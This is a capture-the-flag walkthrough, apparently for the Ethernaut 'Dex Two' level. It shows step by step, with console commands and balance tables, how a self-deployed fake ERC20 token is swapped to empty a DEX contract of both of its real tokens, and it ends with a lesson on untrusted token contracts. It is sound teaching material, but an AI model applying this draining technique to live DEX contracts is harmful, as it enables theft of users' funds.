# How to do

Create new token
- deploy attackDex2 on remix with total supply 400
  - address 0x73c3c6A2E2b1CDE034F15A8e97d63435Cbe0BD08
- approve instance address 0xd6902cC19A4013919335F27CD7e37e6d7A277E91 with 400 
- transfer 100 attackToken to Dex2

Set up token addresses

```ruby
attackToken = '0x73c3c6A2E2b1CDE034F15A8e97d63435Cbe0BD08'
token1 = await contract.token1()
0x590dD5AA72BA9Be713A960A46C9C09d3a28614A6
token2 = await contract.token2()
0x5882b7FCDc7815A8ef570b46aD3619e7Ee3DE204
```

Check attackToken balance on Dex2 contract

```ruby
await contract.balanceOf(attackToken, instance).then(v => v.toString())
100
```

|        | DEX    |             |        | player |             |
|--------|--------|-------------|--------|--------|-------------|
| token1 | token2 | attackToken | token1 | token2 | attackToken |
| 100    | 100    | 100         | 10     | 10     | 300         |


Approve token 1 and 2

```ruby
await contract.approve(contract.address, 500)
```

Swap 100 of player's attackToken with token1:

```ruby
await contract.swap(attackToken, token1, 100)
```

This would drain all of token1 from DexTwo.

```ruby
await contract.balanceOf(token1, instance).then(v => v.toString())
0
```

|        | DEX    |             |        | player |             |
|--------|--------|-------------|--------|--------|-------------|
| token1 | token2 | attackToken | token1 | token2 | attackToken |
| 100    | 100    | 100         | 10     | 10     | 300         |
| 0      | 100    | 200         | 110    | 10     | 200         |

We need get 100 token2 in Dex2 we need to use 200 attackToken for swap.

```
await contract.swap(attackToken, token2, 200)
```

token2 is drained.

```ruby
await contract.balanceOf(token2, instance).then(v => v.toString())
0
```

|        | DEX    |             |        | player |             |
|--------|--------|-------------|--------|--------|-------------|
| token1 | token2 | attackToken | token1 | token2 | attackToken |
| 100    | 100    | 100         | 10     | 10     | 300         |
| 0      | 100    | 200         | 110    | 10     | 200         |
| 0      | 0      | 400         | 110    | 110    | 0           |

# Result

As we've repeatedly seen, interaction between contracts can be a source of unexpected behavior.

Just because a contract claims to implement the [ERC20](https://eips.ethereum.org/EIPS/eip-20) spec does not mean it's trust worthy.

Some tokens deviate from the ERC20 spec by not returning a boolean value from their **transfer** methods. See [Missing return value bug - At least 130 tokens affected](https://medium.com/coinmonks/missing-return-value-bug-at-least-130-tokens-affected-d67bf08521ca).

Other ERC20 tokens, especially those designed by adversaries could behave more maliciously.

If you design a DEX where anyone could list their own tokens without the permission of a central authority, then the correctness of the DEX could depend on the interaction of the DEX contract and the token contracts being traded.